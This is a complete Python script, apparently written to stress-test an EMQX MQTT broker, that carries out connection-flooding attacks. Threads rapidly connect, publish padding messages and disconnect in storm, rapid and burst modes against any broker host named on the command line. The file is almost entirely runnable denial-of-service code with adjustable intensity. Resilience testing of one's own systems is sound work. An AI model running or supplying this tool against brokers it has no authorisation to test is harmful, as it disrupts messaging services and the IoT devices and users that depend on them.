#!/usr/bin/env python3
"""
MQTT Reconnect Storm Attack Script (Windows Compatible)
=======================================================
Simulates reconnect storm attacks to test EMQX connection handling and resilience.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class ReconnectStormAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 username=None, password=None, use_tls=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.username = username
        self.password = password
        self.use_tls = use_tls
        self.attack_stats = {
            "reconnect_attempts": 0,
            "connections_successful": 0,
            "connections_failed": 0,
            "disconnections": 0,
            "messages_sent": 0,
            "start_time": None,
            "end_time": None
        }
        
    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)
            
            if self.use_tls:
                client.tls_set()
            
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None
    
    def reconnect_storm_worker(self, worker_id, num_reconnects=50, min_delay_ms=10, max_delay_ms=100):
        """Worker thread for reconnect storm attack"""
        print(f" Worker {worker_id}: Starting reconnect storm attack...")
        
        for reconnect in range(num_reconnects):
            try:
                # Create unique client ID for each reconnect
                client_id = f"reconnect_storm_{worker_id}_{reconnect}"
                client = self.create_client(client_id)
                
                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue
                
                def on_connect(client, userdata, flags, rc, properties):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        if reconnect % 10 == 0:  # Don't spam
                            print(f" Worker {worker_id}: Reconnect {reconnect+1} successful")
                        
                        # Send a few messages quickly
                        for i in range(3):
                            try:
                                payload = {
                                    "attack_type": "reconnect_storm",
                                    "worker_id": worker_id,
                                    "reconnect_id": reconnect + 1,
                                    "message_id": i,
                                    "timestamp": datetime.now(timezone.utc).isoformat(),
                                    "storm_data": "S" * random.randint(50, 200)
                                }
                                
                                result = client.publish("test/reconnect", json.dumps(payload), qos=0)
                                if result.rc == 0:
                                    self.attack_stats["messages_sent"] += 1
                                
                            except Exception as e:
                                pass  # Ignore message errors during storm
                        
                        # Stay connected briefly
                        time.sleep(random.uniform(0.1, 0.5))
                        
                    else:
                        self.attack_stats["connections_failed"] += 1
                        if reconnect % 10 == 0:  # Don't spam
                            print(f" Worker {worker_id}: Reconnect {reconnect+1} failed: {rc}")
                
                def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
                    self.attack_stats["disconnections"] += 1
                
                client.on_connect = on_connect
                client.on_disconnect = on_disconnect
                
                # Connect to broker
                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()
                
                self.attack_stats["reconnect_attempts"] += 1
                
                # Brief connection time
                time.sleep(random.uniform(0.1, 0.3))
                
                # Disconnect
                client.loop_stop()
                client.disconnect()
                
                # Random delay before next reconnect
                delay = random.uniform(min_delay_ms, max_delay_ms) / 1000.0
                time.sleep(delay)
                
            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                if reconnect % 10 == 0:  # Don't spam errors
                    print(f" Worker {worker_id}: Error in reconnect {reconnect+1}: {e}")
        
        print(f" Worker {worker_id}: Completed reconnect storm attack")
    
    def rapid_reconnect_worker(self, worker_id, duration_seconds=30, reconnect_interval_ms=50):
        """Worker thread for rapid reconnect attack"""
        print(f" Worker {worker_id}: Starting rapid reconnect attack...")
        
        start_time = time.time()
        reconnect_count = 0
        
        while time.time() - start_time < duration_seconds:
            try:
                # Create unique client ID for each reconnect
                client_id = f"rapid_reconnect_{worker_id}_{reconnect_count}"
                client = self.create_client(client_id)
                
                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue
                
                def on_connect(client, userdata, flags, rc, properties):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        if reconnect_count % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id}: Rapid reconnect {reconnect_count+1} successful")
                    else:
                        self.attack_stats["connections_failed"] += 1
                
                def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
                    self.attack_stats["disconnections"] += 1
                
                client.on_connect = on_connect
                client.on_disconnect = on_disconnect
                
                # Connect to broker
                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()
                
                self.attack_stats["reconnect_attempts"] += 1
                reconnect_count += 1
                
                # Very brief connection time
                time.sleep(0.05)
                
                # Disconnect
                client.loop_stop()
                client.disconnect()
                
                # Wait for next reconnect
                time.sleep(reconnect_interval_ms / 1000.0)
                
            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                if reconnect_count % 20 == 0:  # Don't spam errors
                    print(f" Worker {worker_id}: Error in rapid reconnect {reconnect_count+1}: {e}")
        
        print(f" Worker {worker_id}: Completed rapid reconnect attack")
    
    def burst_reconnect_worker(self, worker_id, burst_size=20, burst_interval_ms=1000, num_bursts=10):
        """Worker thread for burst reconnect attack"""
        print(f" Worker {worker_id}: Starting burst reconnect attack...")
        
        for burst in range(num_bursts):
            print(f" Worker {worker_id}: Starting burst {burst+1}/{num_bursts}")
            
            # Create multiple clients simultaneously
            clients = []
            for i in range(burst_size):
                try:
                    client_id = f"burst_reconnect_{worker_id}_{burst}_{i}"
                    client = self.create_client(client_id)
                    
                    if client:
                        clients.append(client)
                        
                except Exception as e:
                    self.attack_stats["connections_failed"] += 1
            
            # Connect all clients simultaneously
            for i, client in enumerate(clients):
                try:
                    def on_connect(client, userdata, flags, rc, properties):
                        if rc == 0:
                            self.attack_stats["connections_successful"] += 1
                        else:
                            self.attack_stats["connections_failed"] += 1
                    
                    def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
                        self.attack_stats["disconnections"] += 1
                    
                    client.on_connect = on_connect
                    client.on_disconnect = on_disconnect
                    
                    client.connect(self.broker_host, self.broker_port, 60)
                    client.loop_start()
                    
                    self.attack_stats["reconnect_attempts"] += 1
                    
                except Exception as e:
                    self.attack_stats["connections_failed"] += 1
            
            # Brief connection time
            time.sleep(0.2)
            
            # Disconnect all clients
            for client in clients:
                try:
                    client.loop_stop()
                    client.disconnect()
                except:
                    pass
            
            # Wait between bursts
            if burst < num_bursts - 1:
                time.sleep(burst_interval_ms / 1000.0)
        
        print(f" Worker {worker_id}: Completed burst reconnect attack")
    
    def launch_attack(self, attack_type="storm", num_workers=3, num_reconnects=50, 
                     min_delay_ms=10, max_delay_ms=100, duration_seconds=30, 
                     reconnect_interval_ms=50, burst_size=20, burst_interval_ms=1000, num_bursts=10):
        """Launch reconnect storm attack"""
        print(f" Starting Reconnect Storm Attack")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Reconnects per worker: {num_reconnects}")
        print(f"   Delay range: {min_delay_ms}-{max_delay_ms}ms")
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        
        # Create worker threads based on attack type
        threads = []
        
        if attack_type == "rapid":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.rapid_reconnect_worker,
                    args=(i, duration_seconds, reconnect_interval_ms)
                )
                threads.append(thread)
        elif attack_type == "burst":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.burst_reconnect_worker,
                    args=(i, burst_size, burst_interval_ms, num_bursts)
                )
                threads.append(thread)
        else:  # storm
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.reconnect_storm_worker,
                    args=(i, num_reconnects, min_delay_ms, max_delay_ms)
                )
                threads.append(thread)
        
        # Start all workers
        for thread in threads:
            thread.start()
        
        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()
    
    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Reconnect attempts: {self.attack_stats['reconnect_attempts']}")
        print(f"Connections successful: {self.attack_stats['connections_successful']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Disconnections: {self.attack_stats['disconnections']}")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        
        if self.attack_stats['reconnect_attempts'] > 0:
            success_rate = (self.attack_stats['connections_successful'] / 
                           self.attack_stats['reconnect_attempts'] * 100)
            print(f"Connection success rate: {success_rate:.1f}%")
        
        if duration > 0:
            print(f"Reconnects per second: {self.attack_stats['reconnect_attempts']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Reconnect Storm Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    parser.add_argument("--type", choices=["storm", "rapid", "burst"], default="storm", 
                       help="Attack type: storm, rapid, or burst")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--reconnects", type=int, default=50, help="Reconnects per worker (storm)")
    parser.add_argument("--min-delay", type=int, default=10, help="Minimum delay between reconnects (ms)")
    parser.add_argument("--max-delay", type=int, default=100, help="Maximum delay between reconnects (ms)")
    parser.add_argument("--duration", type=int, default=30, help="Duration for rapid attack (s)")
    parser.add_argument("--interval", type=int, default=50, help="Interval for rapid attack (ms)")
    parser.add_argument("--burst-size", type=int, default=20, help="Burst size for burst attack")
    parser.add_argument("--burst-interval", type=int, default=1000, help="Interval between bursts (ms)")
    parser.add_argument("--num-bursts", type=int, default=10, help="Number of bursts")
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = ReconnectStormAttack(
        broker_host=args.broker,
        broker_port=args.port,
        username=args.username,
        password=args.password,
        use_tls=args.tls
    )
    
    # Launch attack
    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        num_reconnects=args.reconnects,
        min_delay_ms=args.min_delay,
        max_delay_ms=args.max_delay,
        duration_seconds=args.duration,
        reconnect_interval_ms=args.interval,
        burst_size=args.burst_size,
        burst_interval_ms=args.burst_interval,
        num_bursts=args.num_bursts
    )

if __name__ == "__main__":
    main()
